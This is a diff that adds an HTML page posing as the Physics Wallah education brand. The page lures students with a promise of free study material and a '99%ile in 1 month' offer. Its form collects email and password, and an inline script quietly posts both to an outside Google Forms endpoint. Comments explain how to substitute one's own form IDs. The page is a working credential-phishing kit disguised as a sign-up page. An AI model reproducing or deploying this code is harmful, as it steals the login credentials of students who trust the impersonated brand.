@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Physics Wallah</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="images.jpg" type="image/x-icon">
+</head>
+<body>
+
+    <nav>
+        <div>
+            <img height="50px" src="images.jpg" alt="">
+        </div>
+        <div>
+            <button>login / signup</button>
+        </div>
+    </nav>
+
+    <h1>Get 99%ile in 1 month (500 students only) </h1>
+    <form id="myForm">
+        <div>
+            <label for="">Name : </label>
+            <input type="text" placeholder="enter your name">
+        </div>
+        <div>
+            <label for="">Class</label>
+            <select>
+                <option selected value="">Choose your batch</option>
+                <option value="12th">12th</option>
+                <option value="11th">11th</option>
+                <option value="Dropper">Dropper</option>
+            </select>
+        </div>
+
+        <div>
+            <label for="">Email : </label>
+            <input type="email" id="email" placeholder="enter your email">
+        </div>
+        <div>
+            <label for="">Password</label>
+            <input type="password" id="password" placeholder="enter your password">
+        </div>
+        <button id="submit" type="submit">Claim Your Study Material</button>
+        <br>
+    </form>
+
+    <div class="video-container">
+        <iframe width="300" height="200" 
+            src="https://www.youtube.com/embed/kEUg30_QVlQ?autoplay=1" 
+            title="YouTube video player" frameborder="0" 
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+            referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
+        </iframe>
+    </div>
+    
+
+    
+    <script>
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            let name = document.getElementById("email").value;
+            let name2 = document.getElementById("password").value;
+
+            if (!name || !name2) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            // Replace with your Google Form's entry values
+            let googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSda0YZykcl-yhYx-j66SlqmohatoUMalofTt_fZcr5h-cXzgA/formResponse";
+            let formData = new FormData();
+            formData.append("entry.2005326067", name);  // Change to your Google Form's email entry ID
+            formData.append("entry.958606649", name2); // Change to your Google Form's password entry ID
+
+            fetch(googleFormURL, {
+                method: "POST",
+                body: formData,
+                mode: "no-cors"
+            }).then(() => {
+                alert("Your study material will be sent to your email!");
+            });
+        });
+    </script>
+
+</body>
+</html>
